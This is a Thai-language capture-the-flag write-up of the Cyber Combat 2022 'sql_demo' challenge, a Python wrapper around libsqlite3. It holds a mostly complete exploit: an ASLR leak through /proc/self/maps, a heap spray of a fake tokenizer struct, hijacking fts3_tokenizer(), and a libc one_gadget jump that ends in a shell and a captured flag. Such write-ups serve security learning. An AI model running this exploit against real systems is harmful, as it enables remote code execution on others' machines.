+++ 
authors = ["bongtrop",]
title = "Cyber Combat 2022 (Final) - sql_demo"
date = "2022-07-24"
description = "ได้มีโอกาศไปแข่งขัน Cyber Combat 2022 ของทาง TB-CERT ทีมชื่อ ANYA (อาเนีย ไม่ใช่ อันย่า) และมีโจทย์ข้อหนึ่งที่ทำเสร็จหลังงานจบไปนิดเดียว ด้วยความเสียดายเลยนำมาเขียน blog ซะเลย"
images = ["https://i.imgur.com/knSz0Co.png?1",]
+++

![Cover](https://i.imgur.com/knSz0Co.png?1)

ได้มีโอกาศไปแข่งขัน Cyber Combat 2022 ของทาง TB-CERT ทีมชื่อ ANYA (อาเนีย ไม่ใช่ อันย่า) และมีโจทย์ข้อหนึ่งที่ทำเสร็จหลังงานจบไปนิดเดียว ด้วยความเสียดายเลยนำมาเขียน blog ซะเลย

โดยโจทย์ข้อนี้เท่าที่ลองทดลองทำดูจะเป็นโจทย์ Memory Corruption หรือโจทย์ PWN ข้อหนึ่ง ซึ้งหลุดจากข้ออื่น ๆ ไปมากชื่อว่า [sql_demo](https://drive.google.com/file/d/1pwhFvdb-CvpK2_W0b6ieAzdlEilneFi-/view?usp=sharing) โดยตัวโจทย์จะเป็นภาษา Python และมีเนื้อหาดังนี้

```python
#!/usr/bin/env python2

import ctypes
import sys
#import os

SQLITE_OK = 0

@ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.POINTER(ctypes.c_char_p), ctypes.POINTER(ctypes.c_char_p))
def callback(not_used, argc, argv, col_names):
    values = []
    for i in range(0, argc):
        values.append(argv[i])
    print("|%s|" % '|'.join(values))
    return 0

libsqlite = ctypes.cdll.LoadLibrary("libsqlite3.so.0")

db = ctypes.c_void_p(0)
err_msg = ctypes.c_char_p(0)

rc = libsqlite.sqlite3_open(":memory:", ctypes.byref(db))
if rc != SQLITE_OK:
    print("Can't open database")
    libsqlite.sqlite3_close(db)
    sys.exit(-1)

while True:
    print('>'),
    sql = raw_input()

    if sql == '.quit':
        libsqlite.sqlite3_free(err_msg);
        libsqlite.sqlite3_close(db);
        sys.exit(0);

    if sql == '.thumbprint':
        print(id(__doc__))
        print("%02x%02x" % (db.value ^ ctypes.cast(libsqlite.sqlite3_exec, ctypes.c_void_p).value, db.value ^ id(__doc__)))
        continue

    if sql.startswith('.read'):
        try:
            with open(sql[6:].strip(), "r") as f:
                for line in f:
                    print(line),
        except:
            print("E! Can't read file")
        continue

    rc = libsqlite.sqlite3_exec(db, sql, callback, 0, ctypes.byref(err_msg))
    if rc != SQLITE_OK:
        print("E! %s" % err_msg.value);
```

จะเห็นว่าโจทย์ไม่ได้มีอะไรแปลกมากจะเป็นการ load `libsqlite3.so.0` และใช้งาน `sqlite3_exec()` function โดยตรง และการแข่งขันครั้งนี้เป็น การแข่งขันแบบ Attack & Defense โดยที่ flag จะถูกนำไปเขียนเป็นไฟล์​ไว้ใน `/data` โดยที่ชื่อไฟล์ไม่สามารถเดาได้

จากการ research ไม่พบ function default ของ sqlite ที่จะสามารถ list directory ได้ (ติดหาเรื่องนี้นานมาก) หลังจากเริ่มปลง ผมจึงเริ่มไปลองหาช่องโหว่จากช่องทางอื่น และไปเห็นที่ตัวโจทย์ตั้งใจ โหลดตัว `libsqlite3.so.0` lib เข้ามาใช้งานซึ่งฝืนมาก ผมจึงเข้าไปใน docker โจทย์ใน instance ตัวเองเพื่อดู version ของ sqlite lib

```
root@team3:~# docker exec -ti -u root sql_demo bash
root@56bddfab4226:/data# ls -al /usr/lib/x86_64-linux-gnu/libsqlite3.so.0
lrwxrwxrwx 1 root root 19 Feb 24  2021 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0 -> libsqlite3.so.0.8.6
```

จากที่เห็นเป็น libsqlite3 version 0.8.6 ค้นไปค้นมา เจอ [blog](https://codecolor.ist/2016/01/20/bypass-php-safe-mode-by-abusing-sqlite3-s-fts-tokenizer/) นี้ซึ่งตรง version กับโจทย์พอดีเปะ ๆ และใน blog อธิบายวิธีโจมตีมาอย่างละเอียดแล้ว โดยสรุปเลยคือ ถ้าเราเรียก function `fts3_tokenizer()` และใส่ argument ที่ 2 เป็น address ของ object sqlite3_tokenizer_module ที่เราปลอมขึ้นมาได้ มันจะสร้าง `sqlite3_tokenizer_module` object ที่ชี้ไปที่ address นั้นจริง ๆ ทำให้เราสามารถ ชี้ไปที่ malicious address ที่เราเตรียมไว้ จากนั้น call function pointer `xCreate`, `xDestroy`, `xOpen`, `xClose` หรือ `xNext` ของ object นั้น เพื่อ take over control flow

**sqlite3_tokenizer_module Object Schema**

```c
struct sqlite3_tokenizer_module {
    int iVersion;
    int (*xCreate) (int argc, const char * const *argv, sqlite3_tokenizer **ppTokenizer);
    int (*xDestroy) (sqlite3_tokenizer *pTokenizer);
    int (*xOpen) (sqlite3_tokenizer *pTokenizer, const char *pInput, int nBytes, sqlite3_tokenizer_cursor **ppCursor);
    int (*xClose) (sqlite3_tokenizer_cursor *pCursor);
    int (*xNext) (sqlite3_tokenizer_cursor *pCursor, const char **ppToken, int *pnBytes, int *piStartOffset, int *piEndOffset, int *piPosition);
};
```

ดังนั้นปัญหาของเราตอนนี้คือ เราจะเอา object `sqlite3_tokenizer_module` ปลอมไปใส่ไว้ใน memory ยังไง จากการทดลองพบว่า เราสามารถ select string ที่เราต้องการแล้วมันจะไปอยู่ใน memory ส่วนของ heap เอง แต่ว่าเราต้อง select ยาว ๆ หน่อยเพราะว่าต้น ๆ จะถูก overwrite ได้จากคำสั่งอื่น ๆ หลังจาก payload ของเราถูก free ผมจึงเลือกใช้

```sql
select replace(hex(zeroblob(1000)), '00', 'ANYA')
```

Ref: https://stackoverflow.com/a/51792334

และอีกความยากคือ ASLR ของ Linux ที่เราจำเป็นจะต้อง bypass เช่นกัน ASLR โดยเบื่องต้นจะเป็นการ random base memory ของแต่ละ segment ทำให้เราไม่สามารถเดาได้ว่าข้อมูลที่เราใส่เข้าไปเยอะ ๆ ใน heap อยู่ตรงไหน

แต่เดียวก่อนเรามี `.read` ที่สามารถนำไปอ่าน `/proc/self/maps` file โดยด้านใน file นี้จะมี memory mapping ของแต่ละ segment อยู่ด้วยทำให้เราสามารถ bypass ASLR ได้อย่างง่ายดาย ดังรูปต่อไปนี้

![.read](https://i.imgur.com/F31eNTD.png)

จากนั้นเราก็แค่ต้องเขียน script เพื่อเข้าไปอ่าน เช่น

```python
def execute(sql, last=False):
    global s
    s.sendline(sql)
    return s.readuntil("> ")

s = Sock(host, 1433)
s.readuntil(">")

s.sendline(".read /proc/self/maps")
maps = s.readuntil("> ")[:-2].splitlines()
libc_addr = int(maps[23][:12], 16)
heap_addr = int(maps[6][:12], 16)
```

ต่อไปเราก็ทำการยัด malicious `sqlite3_tokenizer_module` object ใส่ heap ซะดัง script ต่อไปนี้ (ไม่รู้ต้อง jmp ไปไหน ให้ไป `0xdeadbeef` ก่อนเลย)

```python
spawn_shell_addr = 0xdeadbeef

shell_struct =  struct.pack("<Q", 0)
shell_struct += struct.pack("<Q", spawn_shell_addr)
shell_struct += struct.pack("<Q", spawn_shell_addr)
shell_struct += struct.pack("<Q", spawn_shell_addr)
shell_struct += struct.pack("<Q", spawn_shell_addr)
shell_struct += struct.pack("<Q", spawn_shell_addr)

execute(f"select replace(hex(zeroblob(31337)), '00', x'414E5941414E5941{shell_struct.hex()}414E5941414E5941');")
```

หลังจากยัดใส่ไปแล้วเราจะรู้ได้ยังไง ว่ามันอยู่ตรงไหนของ heap วิธีของผมคือเข้าไป debug ใน container โจทย์เลยจบ ๆ ไป (ก่อนเข้าไปดู ให้ยิง step ด้านบนและเปิด connection ค้างไว้ก่อน) ดังนี้

```
root@team3:~# docker exec -ti -u root sql_demo bash
root@56bddfab4226:/data# apt install procps gdb
root@56bddfab4226:/data# ps -A
    PID TTY          TIME CMD
      1 ?        00:00:00 sh
      7 ?        00:00:00 socat
   2812 pts/2    00:00:00 bash
   2839 pts/0    00:00:00 bash
   2897 ?        00:00:00 socat
   2898 ?        00:00:00 python
   2902 ?        00:00:00 socat
   2903 ?        00:00:00 python
   2904 pts/0    00:00:00 ps
```

เราได้ target process id (`2903`) แล้ว จากนั้น debug เลย โดยใช้ `gdb -q -p 2903` attach เข้าไปใน process (ห้ามลืมใส่ ptrace CAP ให้ container ใน docker-compose.yml ด้วยนะ) จากนั้น ดู memory map ก่อนเลยใช้ คำสั่ง `i proc mapping`

```
root@56bddfab4226:/data# gdb -q -p 2903
Attaching to process 2903
(gdb) i proc mapping
process 2903
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x55e689a3a000     0x55e689a87000    0x4d000        0x0 /usr/bin/python2.7
      0x55e689a87000     0x55e689c1c000   0x195000    0x4d000 /usr/bin/python2.7
      0x55e689c1c000     0x55e689d31000   0x115000   0x1e2000 /usr/bin/python2.7
      0x55e689d32000     0x55e689d34000     0x2000   0x2f7000 /usr/bin/python2.7
      0x55e689d34000     0x55e689dab000    0x77000   0x2f9000 /usr/bin/python2.7
      0x55e689dab000     0x55e689dce000    0x23000        0x0
      0x55e68b514000     0x55e68b63a000   0x126000        0x0 [heap]
      0x7f6665121000     0x7f6665131000    0x10000        0x0 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
      0x7f6665131000     0x7f6665229000    0xf8000    0x10000 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
      0x7f6665229000     0x7f666525d000    0x34000   0x108000 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
      0x7f666525d000     0x7f6665261000     0x4000   0x13b000 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
      0x7f6665261000     0x7f6665264000     0x3000   0x13f000 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
      0x7f6665264000     0x7f6665266000     0x2000        0x0 /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
      0x7f6665266000     0x7f666526c000     0x6000     0x2000 /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
      0x7f666526c000     0x7f666526e000     0x2000     0x8000 /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
      0x7f666526e000     0x7f666526f000     0x1000     0x9000 /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
      0x7f666526f000     0x7f6665270000     0x1000     0xa000 /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
      0x7f6665270000     0x7f6665277000     0x7000        0x0 /usr/lib/python2.7/lib-dynload/_ctypes.x86_64-linux-gnu.so
      0x7f6665277000     0x7f6665286000     0xf000     0x7000 /usr/lib/python2.7/lib-dynload/_ctypes.x86_64-linux-gnu.so
[...]
```

จะเจอว่า heap อยู่ที่ `0x55e68b514000` ถึง `0x55e68b63a000` ก็ค้นหาคำว่า `ANYAANYA` ที่เราใส่เป็น prefix และ postfix ก่อนเลย ใช้ `find` ดังต่อไปนี้

```
(gdb) find 0x55e68b514000,0x55e68b63a000,"ANYAANYA"
0x55e68b5d4288
0x55e68b5d42c0
0x55e68b619928
[...]
0x55e68b635fe8
0x55e68b636028
0x55e68b636068
0x55e68b6360a8
0x55e68b6360e8
0x55e68b636128
0x55e68b636168
0x55e68b6361a8
warning: Unable to access 15960 bytes of target memory at 0x55e68b63
```

จะเจอ address ที่มีค่าเป็น `ANYAANYA` แล้ว จากนั้นให้ใช้อันท้าย ๆ เพราะว่าจะมีโอกาศภูก overwrite ยาก ลองส่องดูว่าตรงกับ struct ที่เรายัดไว้ไหม

```
(gdb) x/20xg 0x55e68b6361a8 - 48
0x55e68b636178: 0x00000000deadbeef 0x00000000deadbeef
0x55e68b636188: 0x00000000deadbeef 0x00000000deadbeef
0x55e68b636198: 0x00000000deadbeef 0x41594e4141594e41
0x55e68b6361a8: 0x41594e4141594e41 0x0000000000000000
0x55e68b6361b8: 0x00000000deadbeef 0x00000000deadbeef
0x55e68b6361c8: 0x00000000deadbeef 0x00000000deadbeef
0x55e68b6361d8: 0x00000000deadbeef 0x41594e4141594e41
0x55e68b6361e8: 0x41594e4141594e41 0x0000000000000000
0x55e68b6361f8: 0x00000000deadbeef 0x00000000deadbeef
0x55e68b636208: 0x00000000deadbeef 0x00000000deadbeef
(gdb) x/6xg 0x55e68b6361b0
0x55e68b6361b0: 0x0000000000000000 0x00000000deadbeef
0x55e68b6361c0: 0x00000000deadbeef 0x00000000deadbeef
0x55e68b6361d0: 0x00000000deadbeef 0x00000000deadbeef
```

ตรงจากนั้นก็หา offset ระหว่าง base heap และตัว object ของเราซะ (แนะนำว่าให้เป็นอันท้าย ๆ เพราะจะได้ไม่ถูก overwrite ผมติดตรงนี้นานมาก มารู้ทีหลังว่ามันโดนคำสั่งอื่นแย่งไปใช้ได้)

```
(gdb) p/x 0x55e68b6361b0 - 0x55e68b514000
$1 = 0x1221b0
```

หลังจากได้ offset แล้วก็ยัดเข้า function `fts3_tokenizer()` เลยดังนี้

```python
# Calc from GDB
heap_offset = 0x1221b0
shell_struct_addr = heap_addr + heap_offset
print("Struct Addr:", hex(shell_struct_addr))
shell_struct_addr_hex = struct.pack("<Q", shell_struct_addr).hex()

execute(f"select hex(fts3_tokenizer('shell', x'{shell_struct_addr_hex}'));")
```

สุดท้ายก็แค่ trick ให้ sqlite เรียก function `xCreate` ก็พอแล้ว เราก็จะ take over control flow ไปที่ `0xdeadbeef` ได้แล้ว

```python
s.sendline('create virtual table shell using fts3(tokenize=shell);')
s.interactive()
```

ลอง debug ดูเหมือนเดิม เรียบร้อยเด้งไป `0xdeadbeaf` แล้ว

```
root@56bddfab4226:/data# ps -A
    PID TTY          TIME CMD
      1 ?        00:00:00 sh
      7 ?        00:00:00 socat
   2812 pts/2    00:00:00 bash
   2839 pts/0    00:00:00 bash
   2897 ?        00:00:00 socat
   2898 ?        00:00:00 python
   2918 ?        00:00:00 socat
   2919 ?        00:00:00 python
   2942 ?        00:00:00 socat
   2943 ?        00:00:00 python
   2944 pts/0    00:00:00 ps
root@56bddfab4226:/data# gdb -q -p 2943
Attaching to process 2943
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000000deadbeef in ?? ()
```

ปัญหาสุดท้ายแล้วต้อง jump ไปไหนหละถึงจะได้ shell พอถึงตรงนี้ก็ใกล้จบงานแล้ว เลยปลงไม่ได้ตั้งใจทำต่อ

หลังจากตรงนี้จะเป็น work หลังจากจบงานนะครับ (เศร้ามาก)

หลังจากจบงาน พึ่งมานึกได้ว่าโลกนี้มี `one_gadget` นี้หว่า จัดดิครับ

FYI: `one_gadget` คือ address ที่เมื่อ jmp ไปแล้วจะได้ shell เลยครับ ผมใช้ (https://github.com/david942j/one_gadget)

```
docker cp sql_demo_test:/lib/x86_64-linux-gnu/libc-2.31.so .
root@team3:~# one_gadget libc-2.31.so
0xc96da execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc96dd execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc96e0 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

เปลี่ยน `spawn_shell_addr` จาก 0xdeadbeef เป็น one gadget เลยครับ

```
spawn_shell_addr = libc_addr + 0xc96da
```

สุดท้ายทักทายทีม @Earth sec guys ซักหน่อย และได้ flag (ทีม @Earch อยู่ที่ `10.60.6.3` นะครับ)

```
bongtrop@Pongsakorns-MacBook-Pro:client/ (master~) $ MY_IP=10.60.6.3 python spl_sql_demo_test_2.py
Start Exploit !
Local Test
Target: 10.60.6.3
Struct Addr: 0x55becfd6d1b0
: 0: can't access tty; job control turned off
$ id
uid=101(sql) gid=65534(nogroup) groups=65534(nogroup)
$ ls -alt | head
total 424
drwxr-xr-x 2 sql  root    4096 Sep 22 07:59 .
-rw-r--r-- 1 sql  nogroup 8192 Sep 22 07:59 uw09-9yv8-qs65
-rw-r--r-- 1 sql  nogroup 8192 Sep 22 07:58 4585-kb5e-5ri7
-rw-r--r-- 1 sql  nogroup 8192 Sep 22 07:57 8ltp-yr53-tewb
-rw-r--r-- 1 sql  nogroup 8192 Sep 22 07:56 svv7-bshi-1lw9
-rw-r--r-- 1 sql  nogroup 8192 Sep 22 07:55 o51r-r4a8-lbco
-rw-r--r-- 1 sql  nogroup    0 Sep 22 07:54 3uqm-ysiy-sst4
-rw-r--r-- 1 sql  nogroup 8192 Sep 22 07:53 zzxu-jp8z-7i32
-rw-r--r-- 1 sql  nogroup 8192 Sep 22 07:52 x7tb-3dbx-t6ca
$ cat uw09-9yv8-qs65
*]TEAM006_K9QOMEZO1X95CEA7978J2M30AE4C382D$ xt NOT NULL)
```

เสียดายไม่ได้ก่อนงานจบ อยาก "เซ็ตหย่อ สูดตอ ซูดผ่อ สี่หม่อ สองห่อ ใส่ไข่" เครื่อง @Earth จังครับ

สำหรับ exploit ตัวเต็มดูได้จาก
https://gist.github.com/bongtrop/b75071bd82b78869470caa17d30e40e2

## สรุป

ไม่รู้โจทย์ข้อนี้มันโผล่มาได้ไง ความยากคือต่างจากข้ออื่นลิบลับเลย แต่สนุกมากครับ สนุกที่ข้อนี้แหละ
